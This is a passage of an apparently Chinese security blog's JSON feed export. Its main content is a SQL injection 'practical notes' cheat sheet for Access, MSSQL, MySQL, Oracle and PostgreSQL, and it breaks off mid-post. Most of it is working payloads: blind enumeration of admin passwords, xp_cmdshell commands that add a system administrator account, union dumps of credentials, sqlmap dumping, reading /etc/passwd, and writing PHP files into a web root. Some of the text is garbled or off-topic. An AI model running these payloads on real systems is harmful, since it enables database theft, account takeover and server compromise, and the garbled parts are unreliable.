less-25</h2>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h2 id=\"less-26\"><a class=\"markdownIt-Anchor\" href=\"#less-26\">#</a> less-26</h2>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h2 id=\"less-27\"><a class=\"markdownIt-Anchor\" href=\"#less-27\">#</a> less-27</h2>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h2 id=\"less-28\"><a class=\"markdownIt-Anchor\" href=\"#less-28\">#</a> less-28</h2>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h2 id=\"less-29\"><a class=\"markdownIt-Anchor\" href=\"#less-29\">#</a> less-29</h2>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h2 id=\"less-30\"><a class=\"markdownIt-Anchor\" href=\"#less-30\">#</a> less-30</h2>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h2 id=\"less-31\"><a class=\"markdownIt-Anchor\" href=\"#less-31\">#</a> less-31</h2>\n<h2 id=\"less-32\"><a class=\"markdownIt-Anchor\" href=\"#less-32\">#</a> less-32</h2>\n<h2 id=\"less-33\"><a class=\"markdownIt-Anchor\" href=\"#less-33\">#</a> less-33</h2>\n<h2 id=\"less-34\"><a class=\"markdownIt-Anchor\" href=\"#less-34\">#</a> less-34</h2>\n<h2 id=\"less-35\"><a class=\"markdownIt-Anchor\" href=\"#less-35\">#</a> less-35</h2>\n<h2 id=\"less-36\"><a class=\"markdownIt-Anchor\" href=\"#less-36\">#</a> less-36</h2>\n<h2 id=\"less-37\"><a class=\"markdownIt-Anchor\" href=\"#less-37\">#</a> less-37</h2>\n",
            "tags": [
                "安全"
            ]
        },
        {
            "id": "http://example.com/2022/01/14/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5%E5%AE%9E%E6%88%98%E7%AC%94%E8%AE%B0/",
            "url": "http://example.com/2022/01/14/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5%E5%AE%9E%E6%88%98%E7%AC%94%E8%AE%B0/",
            "title": "SQL注入实战笔记",
            "date_published": "2022-01-14T03:40:59.000Z",
            "content_html": "<h1 id=\"sql注入实战笔记\"><a class=\"markdownIt-Anchor\" href=\"#sql注入实战笔记\"></a> SQL注入实战笔记</h1>\n<h2 id=\"access注入\"><a class=\"markdownIt-Anchor\" href=\"#access注入\"></a> ACCESS注入</h2>\n<p>微软数据库， 后缀.mdb</p>\n<h3 id=\"优点\"><a class=\"markdownIt-Anchor\" href=\"#优点\"></a> 优点</h3>\n<ol>\n<li>提高速度和减少代码量</li>\n<li>你可以用几种技巧来提高你的编码速度，但是却找不到有效的算法的替代者。接下来的这几点建议可以提高你的编码速度同时又减少你的应用程序消耗的存储空间。</li>\n<li>用整形数进行数学运算</li>\n<li>即使Microsoft Access会使用一个联合处理器来处理浮点型算术，整型数算术也总是要快一些,当你的计算不含有小数，尽量使用整型或长整型而不是变量或双整型。整型除法同样也要比浮点除法要快。在使用其他一些有效的数据类型时会警告:没有任何东西可以替换有效的运算法则。</li>\n<li>避免使用过程调用</li>\n<li>避免在循环体中使用子程序或函数调用。每一次调用都因额外的工作和时间而给编码增大了负担。每一次调用都要求把函数的局部变量和参数压栈，而栈的大小是固定的，不能随便加大，并且同时还要于Microsoft Access共享。</li>\n</ol>\n<h3 id=\"缺点\"><a class=\"markdownIt-Anchor\" href=\"#缺点\"></a> 缺点</h3>\n<ol>\n<li>数据库过大时，一般ACCESS数据库达到100M左右的时候性能就会开始下降!（例如:访问人数过多时容易造成IIS假死，过多消耗服务器资源等等)</li>\n<li>容易出现各种因数据库刷写频率过快而引起的数据库问题。<br />\n3 . ACCESS数据库安全性比不上其他类型的数据库。<br />\n4 . ACCESS论坛大了以后就很容易出现数据库方面的问题，当论坛数据库在50M以上，帖子5万左右，在线也在100人左右的时候，你的论坛基本上都在处理数据库上花时间，这个时候很可能就会出现数据库慢的情况。</li>\n</ol>\n<h3 id=\"注入点\"><a class=\"markdownIt-Anchor\" href=\"#注入点\"></a> 注入点</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1:99/pro_detail.asp?id=30</span><br></pre></td></tr></table></figure>\n<h3 id=\"判断注入点\"><a class=\"markdownIt-Anchor\" href=\"#判断注入点\"></a> 判断注入点</h3>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">&#x27;</span></span><br><span class=\"line\"><span class=\"string\">and 1 = 1</span></span><br><span class=\"line\"><span class=\"string\">and 1 = 2</span></span><br><span class=\"line\"><span class=\"string\">or 1 = 1</span></span><br><span class=\"line\"><span class=\"string\">or 1 = 2</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br></pre></td></tr></table></figure>\n<h3 id=\"手工注入\"><a class=\"markdownIt-Anchor\" href=\"#手工注入\"></a> 手工注入</h3>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">### 判断数据库类型</span><br><span class=\"line\"><span class=\"keyword\">and</span> <span class=\"keyword\">exists</span> (<span class=\"keyword\">select</span> <span class=\"operator\">*</span> <span class=\"keyword\">from</span> msysobjects)<span class=\"operator\">&gt;</span><span class=\"number\">0</span> access</span><br><span class=\"line\"><span class=\"keyword\">and</span> <span class=\"keyword\">exists</span> (<span class=\"keyword\">select</span> <span class=\"operator\">*</span> <span class=\"keyword\">from</span> sysobjects)<span class=\"operator\">&gt;</span><span class=\"number\">0</span> mysql</span><br><span class=\"line\">### 判断数据表</span><br><span class=\"line\"><span class=\"keyword\">and</span> <span class=\"keyword\">exists</span> (<span class=\"keyword\">select</span> <span class=\"operator\">*</span> <span class=\"keyword\">from</span> admin)<span class=\"operator\">&gt;</span><span class=\"number\">0</span> <span class=\"operator\">/</span><span class=\"keyword\">user</span><span class=\"operator\">/</span>adminuser</span><br><span class=\"line\"><span class=\"keyword\">and</span> <span class=\"keyword\">exists</span> (<span class=\"keyword\">select</span> admin,passwd <span class=\"keyword\">from</span> admin)<span class=\"operator\">&gt;</span><span class=\"number\">0</span> <span class=\"operator\">/</span>pass<span class=\"operator\">/</span>pwd</span><br><span class=\"line\">### 判断字段数目</span><br><span class=\"line\"><span class=\"keyword\">order</span> <span class=\"keyword\">by</span> <span class=\"number\">20</span> </span><br><span class=\"line\">不报错</span><br><span class=\"line\"><span class=\"keyword\">union</span> <span class=\"keyword\">select</span> <span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">3</span>, <span class=\"number\">4</span>, <span class=\"number\">5</span>, <span class=\"number\">6</span>, <span class=\"number\">7</span>, <span class=\"number\">8</span>, <span class=\"number\">9</span>, <span class=\"number\">10</span>, <span class=\"number\">11</span>, <span class=\"number\">12</span>, <span class=\"number\">13</span> <span class=\"keyword\">from</span> admin</span><br><span class=\"line\">查看显示的字段序号</span><br><span class=\"line\">### 爆账号密码</span><br><span class=\"line\"><span class=\"keyword\">and</span> (<span class=\"keyword\">select</span> len(admin) <span class=\"keyword\">from</span> admin)<span class=\"operator\">&gt;</span><span class=\"number\">4</span></span><br><span class=\"line\"><span class=\"keyword\">and</span> (<span class=\"keyword\">select</span> len(password) <span class=\"keyword\">from</span> admin)<span class=\"operator\">&gt;</span><span class=\"number\">15</span> 大于<span class=\"number\">15</span>一般都是密文</span><br><span class=\"line\"></span><br><span class=\"line\"># 枚举用户名及密码</span><br><span class=\"line\">通过判断ascii码来判断</span><br><span class=\"line\"><span class=\"keyword\">and</span> (<span class=\"keyword\">select</span> top <span class=\"number\">1</span> <span class=\"keyword\">asc</span>(mid(admin,<span class=\"number\">1</span>,<span class=\"number\">1</span>)l <span class=\"keyword\">from</span> admin)<span class=\"operator\">&gt;</span><span class=\"number\">100</span>返回正常说明大于，不正常说明不大于</span><br><span class=\"line\"><span class=\"keyword\">and</span> (<span class=\"keyword\">select</span> top <span class=\"number\">1</span> <span class=\"keyword\">asc</span>(mid(admin,<span class=\"number\">1</span>,<span class=\"number\">1</span>) <span class=\"keyword\">from</span> admin)<span class=\"operator\">&gt;</span><span class=\"number\">50</span>返回正常说明大于</span><br><span class=\"line\"><span class=\"keyword\">and</span> (<span class=\"keyword\">select</span> top <span class=\"number\">1</span> <span class=\"keyword\">asc</span>(mid(admin,<span class=\"number\">1</span>,<span class=\"number\">1</span>) <span class=\"keyword\">from</span> admin)<span class=\"operator\">=</span><span class=\"number\">97</span>返回正常说明等于<span class=\"number\">97</span></span><br><span class=\"line\"><span class=\"number\">97</span>对应的字母为a以此类推</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h2 id=\"mssqlsever注入\"><a class=\"markdownIt-Anchor\" href=\"#mssqlsever注入\"></a> MSSQLSever注入</h2>\n<p>微软数据库， 文件后缀.mdf 日志后缀log.lfd</p>\n<h3 id=\"数据库权限\"><a class=\"markdownIt-Anchor\" href=\"#数据库权限\"></a> 数据库权限</h3>\n<ul>\n<li>sa权限：数据库操作，文件管理，命令执行，注册表读取等 system</li>\n<li>db权限：文件管理,数据库操作等 users-adminstrators</li>\n<li>public权限：数据库操作 guest-users</li>\n</ul>\n<h3 id=\"jsp代码\"><a class=\"markdownIt-Anchor\" href=\"#jsp代码\"></a> jsp代码</h3>\n<figure class=\"highlight jsp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;%</span><br><span class=\"line\">set conn =server.createobject(<span class=\"string\">&quot;adodb.connection)</span></span><br><span class=\"line\"><span class=\"string\">conn.open &quot;</span>provider=sqloledbysource=local;uid=sa;pwd=******;database=database-name<span class=\"string\">&quot;</span></span><br><span class=\"line\"><span class=\"string\">%&gt;</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br></pre></td></tr></table></figure>\n<h3 id=\"手注\"><a class=\"markdownIt-Anchor\" href=\"#手注\"></a> 手注</h3>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">1.</span>判断是否有注入</span><br><span class=\"line\"><span class=\"keyword\">and</span> <span class=\"number\">1</span><span class=\"operator\">=</span><span class=\"number\">1</span></span><br><span class=\"line\"><span class=\"keyword\">and</span> <span class=\"number\">1</span><span class=\"operator\">=</span><span class=\"number\">2</span></span><br><span class=\"line\">判断注入的方法是一样的</span><br><span class=\"line\"><span class=\"number\">2.</span>初步判断是否是mssqland <span class=\"keyword\">user</span><span class=\"operator\">&gt;</span><span class=\"number\">0</span></span><br><span class=\"line\"><span class=\"number\">3.</span>判断数据库系统</span><br><span class=\"line\"><span class=\"keyword\">and</span> (<span class=\"keyword\">select</span> <span class=\"built_in\">count</span>(<span class=\"operator\">*</span>) <span class=\"keyword\">from</span> sysobjects)<span class=\"operator\">&gt;</span><span class=\"number\">0</span> mssql</span><br><span class=\"line\"><span class=\"keyword\">and</span> (<span class=\"keyword\">select</span> <span class=\"built_in\">count</span>() <span class=\"keyword\">from</span> msysobjects)<span class=\"operator\">&gt;</span><span class=\"number\">0</span> access</span><br><span class=\"line\"><span class=\"number\">4.</span>注入参数是字符</span><br><span class=\"line\"><span class=\"string\">&#x27;and[查询条件]and &#x27;</span><span class=\"operator\">=</span><span class=\"string\">&#x27;                      &#x27;</span></span><br><span class=\"line\"><span class=\"number\">5.</span>搜索时没过滤参数的</span><br><span class=\"line\"><span class=\"string\">&#x27;and[查询条件]and &#x27;</span><span class=\"operator\">%</span><span class=\"number\">25</span><span class=\"string\">&#x27;=&#x27;</span></span><br><span class=\"line\"><span class=\"number\">6.</span>猜数表名</span><br><span class=\"line\"><span class=\"keyword\">and</span> (<span class=\"keyword\">select</span> <span class=\"built_in\">Count</span>(<span class=\"operator\">*</span>) <span class=\"keyword\">from</span>[表名])<span class=\"operator\">&gt;</span><span class=\"number\">0</span></span><br><span class=\"line\"><span class=\"number\">7.</span>猜字段</span><br><span class=\"line\"><span class=\"keyword\">and</span> (<span class=\"keyword\">select</span> <span class=\"built_in\">Count</span>(字段名) <span class=\"keyword\">from</span>表名<span class=\"operator\">&gt;</span><span class=\"number\">0</span></span><br><span class=\"line\"><span class=\"number\">8.</span>猜字段中记录长度</span><br><span class=\"line\"><span class=\"keyword\">and</span> (<span class=\"keyword\">select</span> top <span class=\"number\">1</span> len(字段名) <span class=\"keyword\">from</span>表名)<span class=\"operator\">&gt;</span><span class=\"number\">0</span></span><br><span class=\"line\"><span class=\"number\">9</span>(<span class=\"number\">1</span>)猜字段的ascii值(access )</span><br><span class=\"line\"><span class=\"keyword\">and</span> (<span class=\"keyword\">select</span> top <span class=\"number\">1</span> <span class=\"keyword\">asc</span>(mid(字段名,<span class=\"number\">1</span>,<span class=\"number\">1</span>)) <span class=\"keyword\">from</span>表名)<span class=\"operator\">&gt;</span></span><br><span class=\"line\">(<span class=\"number\">2</span>)猜字段的ascii值( mssql)</span><br><span class=\"line\"><span class=\"keyword\">and</span> (<span class=\"keyword\">select</span> top <span class=\"number\">1</span> unicode(<span class=\"built_in\">substring</span>(字段名,<span class=\"number\">1</span>,<span class=\"number\">1</span>)) <span class=\"keyword\">from</span>表名)<span class=\"operator\">&gt;</span><span class=\"number\">0</span></span><br><span class=\"line\"><span class=\"number\">10.</span>测试权限结构( mssql )</span><br><span class=\"line\"><span class=\"keyword\">and</span> <span class=\"number\">1</span><span class=\"operator\">=</span>(<span class=\"keyword\">select</span> IS_SRVROLEMEMBER(<span class=\"string\">&#x27;sysadmin&#x27;</span>));<span class=\"comment\">--</span></span><br><span class=\"line\"><span class=\"keyword\">and</span> <span class=\"number\">1</span><span class=\"operator\">=</span>(<span class=\"keyword\">select</span> IS_SRVROLEMEMBER(<span class=\"string\">&#x27;serveradmin&#x27;</span>));<span class=\"comment\">--</span></span><br><span class=\"line\"><span class=\"keyword\">and</span> <span class=\"number\">1</span><span class=\"operator\">=</span>(<span class=\"keyword\">select</span> IS_SRVROLEMEMBER(<span class=\"string\">&#x27;setupadmin&#x27;</span>));<span class=\"comment\">--</span></span><br><span class=\"line\"><span class=\"keyword\">and</span> <span class=\"number\">1</span><span class=\"operator\">=</span>(<span class=\"keyword\">select</span> IS_SRVROLEMEMBER(<span class=\"string\">&#x27;securityadmin&#x27;</span>));<span class=\"comment\">--</span></span><br><span class=\"line\"><span class=\"keyword\">and</span> <span class=\"number\">1</span><span class=\"operator\">=</span>(<span class=\"keyword\">select</span> IS_SRVROLEMEMBER(<span class=\"string\">&#x27;diskadmin&#x27;</span>));<span class=\"comment\">--</span></span><br><span class=\"line\"><span class=\"keyword\">and</span> <span class=\"number\">1</span><span class=\"operator\">=</span>(<span class=\"keyword\">select</span> IS_SRVROLEMEMBER(<span class=\"string\">&#x27;bulkadmin&#x27;</span>));<span class=\"comment\">--</span></span><br><span class=\"line\"><span class=\"keyword\">and</span> <span class=\"number\">1</span><span class=\"operator\">=</span>(<span class=\"keyword\">select</span> IS_MEMBER(<span class=\"string\">&#x27;db_owner&#x27;</span>));<span class=\"comment\">--</span></span><br><span class=\"line\"><span class=\"number\">11.</span>添加mssql和系统的帐户</span><br><span class=\"line\"><span class=\"keyword\">exec</span> master.dbo.sp_addlogin username;<span class=\"comment\">--</span></span><br><span class=\"line\"><span class=\"keyword\">exec</span> master.dbo.sp_password <span class=\"keyword\">null</span>,username,password;<span class=\"comment\">--</span></span><br><span class=\"line\"><span class=\"keyword\">exec</span> master.dbo.sp_addsrvrolemember sysadmin username;<span class=\"comment\">--</span></span><br><span class=\"line\"><span class=\"keyword\">exec</span> master.dbo.xp_cmdshell <span class=\"string\">&#x27;net user username password/workstations:* /times:all /passwordchg:yes /passwordreq:yes /active:yes /add&#x27;</span>;<span class=\"comment\">--</span></span><br><span class=\"line\"><span class=\"keyword\">exec</span> master.dbo.xp_cmdshell <span class=\"string\">&#x27;net user username password /add&#x27;</span>;<span class=\"comment\">--</span></span><br><span class=\"line\"><span class=\"keyword\">exec</span> master.dbo.xp_cmdshell <span class=\"string\">&#x27;net localgroup administrators username/add&#x27;</span>;<span class=\"comment\">--</span></span><br><span class=\"line\"></span><br><span class=\"line\">## 版本信息</span><br><span class=\"line\"><span class=\"keyword\">and</span> <span class=\"number\">1</span> <span class=\"operator\">=</span>(<span class=\"keyword\">select</span> @<span class=\"variable\">@version</span>)</span><br><span class=\"line\"><span class=\"keyword\">and</span> <span class=\"number\">1</span> <span class=\"operator\">=</span>(<span class=\"keyword\">select</span> db_name())   <span class=\"string\">&#x27;acublog&#x27;</span></span><br><span class=\"line\">## 获取第一个用户</span><br><span class=\"line\"><span class=\"keyword\">and</span> <span class=\"number\">1</span><span class=\"operator\">=</span>(<span class=\"keyword\">select</span> top <span class=\"number\">1</span> name <span class=\"keyword\">from</span> master..sysdatabases wheredbid<span class=\"operator\">&gt;</span><span class=\"number\">4</span> <span class=\"keyword\">and</span> name<span class=\"operator\">&lt;&gt;</span> <span class=\"string\">&#x27;acublog&#x27;</span>)</span><br><span class=\"line\">## 获取第一张表threads</span><br><span class=\"line\">?id<span class=\"operator\">=</span><span class=\"number\">1</span> <span class=\"keyword\">and</span> <span class=\"number\">1</span><span class=\"operator\">=</span>(<span class=\"keyword\">select</span> top <span class=\"number\">1</span> name <span class=\"keyword\">from</span> sysobjects wherextype<span class=\"operator\">=</span><span class=\"string\">&#x27;u&#x27;</span>)   </span><br><span class=\"line\">表<span class=\"string\">&#x27;threads&#x27;</span></span><br><span class=\"line\">## 获取第二张表users</span><br><span class=\"line\">?id<span class=\"operator\">=</span><span class=\"number\">1</span> <span class=\"keyword\">and</span> <span class=\"number\">1</span><span class=\"operator\">=</span>(<span class=\"keyword\">select</span> top <span class=\"number\">1</span> name <span class=\"keyword\">from</span> sysobjects wherextype<span class=\"operator\">=</span><span class=\"string\">&#x27;U&quot; and name &lt;&gt; &#x27;</span>threads<span class=\"string\">&#x27;)</span></span><br><span class=\"line\"><span class=\"string\">以此类推</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"mysql注入\"><a class=\"markdownIt-Anchor\" href=\"#mysql注入\"></a> MySQL注入</h2>\n<p>多个数据库名<br />\n手注同上</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">4.0</span>以上有imformation_schema</span><br><span class=\"line\"><span class=\"keyword\">union</span> <span class=\"keyword\">select</span> <span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"number\">4</span>,<span class=\"number\">5</span>,<span class=\"number\">6</span>,<span class=\"number\">7</span>,<span class=\"number\">8</span>,<span class=\"number\">9</span>,<span class=\"number\">10</span> <span class=\"keyword\">from</span> imformation_schema.tables</span><br><span class=\"line\">database() 数据库名  jian(十六进制<span class=\"number\">0</span>x<span class=\"operator\">*</span><span class=\"operator\">*</span><span class=\"operator\">*</span>)</span><br><span class=\"line\">version() 数据库版本名</span><br><span class=\"line\"><span class=\"keyword\">user</span>() 用户</span><br><span class=\"line\">load_file()查源代码</span><br><span class=\"line\"><span class=\"keyword\">union</span> <span class=\"keyword\">select</span> <span class=\"number\">1</span>,<span class=\"keyword\">user</span>(),<span class=\"number\">3</span>,<span class=\"number\">4</span>,<span class=\"number\">5</span>,<span class=\"number\">6</span>,<span class=\"number\">7</span>,<span class=\"number\">8</span>,<span class=\"number\">9</span>,<span class=\"number\">10</span></span><br><span class=\"line\">@<span class=\"variable\">@version</span>_compile_os 操作系统</span><br><span class=\"line\">## 查表</span><br><span class=\"line\"><span class=\"keyword\">union</span> <span class=\"keyword\">select</span> <span class=\"number\">1</span>,group_concat(table_name),<span class=\"number\">3</span>,<span class=\"number\">4</span>,<span class=\"number\">5</span>,<span class=\"number\">6</span>,<span class=\"number\">7</span>,<span class=\"number\">8</span>,<span class=\"number\">9</span>,<span class=\"number\">10</span> <span class=\"keyword\">from</span> imformation_schema.tables <span class=\"keyword\">where</span> table_schema<span class=\"operator\">=</span><span class=\"number\">0</span>x<span class=\"operator\">*</span><span class=\"operator\">*</span><span class=\"operator\">*</span></span><br><span class=\"line\">## 列</span><br><span class=\"line\"><span class=\"keyword\">union</span> <span class=\"keyword\">select</span> <span class=\"number\">1</span>,group_concat(column_name),<span class=\"number\">3</span>,<span class=\"number\">4</span>,<span class=\"number\">5</span>,<span class=\"number\">6</span>,<span class=\"number\">7</span>,<span class=\"number\">8</span>,<span class=\"number\">9</span>,<span class=\"number\">10</span> <span class=\"keyword\">from</span> imformation_schema.columns <span class=\"keyword\">where</span> table_schema<span class=\"operator\">=</span><span class=\"number\">0</span>x<span class=\"operator\">*</span><span class=\"operator\">*</span><span class=\"operator\">*</span>(列名)</span><br><span class=\"line\">## 账号</span><br><span class=\"line\"><span class=\"keyword\">union</span> <span class=\"keyword\">select</span> <span class=\"number\">1</span>,group_concat(username, <span class=\"number\">0x5c</span>, password),<span class=\"number\">3</span>,<span class=\"number\">4</span>,<span class=\"number\">5</span>,<span class=\"number\">6</span>,<span class=\"number\">7</span>,<span class=\"number\">8</span>,<span class=\"number\">9</span>,<span class=\"number\">10</span> <span class=\"keyword\">from</span> xxxmember</span><br></pre></td></tr></table></figure>\n<h3 id=\"sqlmap\"><a class=\"markdownIt-Anchor\" href=\"#sqlmap\"></a> sqlmap</h3>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sqlmap <span class=\"operator\">-</span>u &quot;http://xxx.com/serch.php?id=45&quot;</span><br><span class=\"line\">sqlmap <span class=\"operator\">-</span>u &quot;http://xxx.com/serch.php?id=45&quot; <span class=\"comment\">--sql-shell</span></span><br><span class=\"line\"><span class=\"operator\">&gt;</span><span class=\"keyword\">select</span> load_file(&quot;/etc/passwd&quot;); 找连接脚本</span><br><span class=\"line\"><span class=\"operator\">&gt;</span><span class=\"keyword\">select</span> user.pwd <span class=\"keyword\">from</span> admin</span><br><span class=\"line\">## 写一句话</span><br><span class=\"line\"><span class=\"keyword\">union</span> <span class=\"keyword\">select</span> <span class=\"number\">1</span>,&quot;&lt;?php phpinfo()?&gt;&quot;,<span class=\"number\">3</span>,<span class=\"number\">4</span>,<span class=\"number\">5</span>,<span class=\"number\">6</span>,<span class=\"number\">7</span>,<span class=\"number\">8</span>,<span class=\"number\">9</span>,<span class=\"number\">10</span> <span class=\"keyword\">into</span> outfile <span class=\"string\">&#x27;./a.php&#x27;</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"oracle注入\"><a class=\"markdownIt-Anchor\" href=\"#oracle注入\"></a> Oracle注入</h2>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">## 判断注入点</span><br><span class=\"line\"><span class=\"keyword\">order</span> <span class=\"keyword\">by</span> <span class=\"number\">3</span></span><br><span class=\"line\"><span class=\"keyword\">and</span> (<span class=\"keyword\">select</span> <span class=\"built_in\">count</span>(<span class=\"operator\">*</span>) <span class=\"keyword\">from</span> admin)<span class=\"operator\">&gt;</span><span class=\"number\">0</span></span><br><span class=\"line\">同上</span><br></pre></td></tr></table></figure>\n<h2 id=\"postgresql注入\"><a class=\"markdownIt-Anchor\" href=\"#postgresql注入\"></a> PostgreSQL注入</h2>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">and</span> <span class=\"number\">1</span> <span class=\"operator\">=</span> <span class=\"built_in\">cast</span>(version() <span class=\"keyword\">as</span> <span class=\"type\">int</span>)</span><br><span class=\"line\"><span class=\"keyword\">and</span> <span class=\"number\">1</span> <span class=\"operator\">=</span> <span class=\"built_in\">cast</span>(<span class=\"keyword\">user</span><span class=\"operator\">||</span><span class=\"number\">123</span> <span class=\"keyword\">as</span> <span class=\"type\">int</span>) 用户名信息 postgres用户相当于root</span><br><span class=\"line\"></span><br><span class=\"line\">## 写一句话</span><br><span class=\"line\">;<span class=\"keyword\">create</span> <span class=\"keyword\">table</span> ccc(w text <span class=\"keyword\">not</span> <span class=\"keyword\">null</span>);</span><br><span class=\"line\">;<span class=\"keyword\">insert</span> <span class=\"keyword\">into</span> ccc <span class=\"keyword\">values</span>($$<span class=\"operator\">&lt;</span>?php phpinfo();?<span class=\"operator\">&gt;</span>$$);</span><br><span class=\"line\">;<span class=\"keyword\">copy</span> ccc(w) <span class=\"keyword\">to</span> $$<span class=\"operator\">/</span>home<span class=\"operator\">/</span>xxx<span class=\"operator\">/</span>html<span class=\"operator\">/</span>script<span class=\"operator\">/</span>shell.php$$;</span><br></pre></td></tr></table></figure>\n<h2 id=\"提交方式注入\"><a class=\"markdownIt-Anchor\" href=\"#提交方式注入\"></a> 提交方式注入</h2>\n<h3 id=\"get\"><a class=\"markdownIt-Anchor\" href=\"#get\"></a> GET</h3>\n<p>?id=1</p>\n<h3 id=\"post\"><a class=\"markdownIt-Anchor\" href=\"#post\"></a> POST</h3>\n<p>表单提交</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">&#x27;or 1=1 登录</span></span><br><span class=\"line\"><span class=\"string\">sqlmap -u &quot;&quot; --data &quot;&quot; -D &quot;dbname&quot; -T &quot;table&quot; -C &quot;column&quot; --dump</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br></pre></td></tr></table></figure>\n<h3 id=\"cookie\"><a class=\"markdownIt-Anchor\" href=\"#cookie\"></a> COOKIE</h3>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span 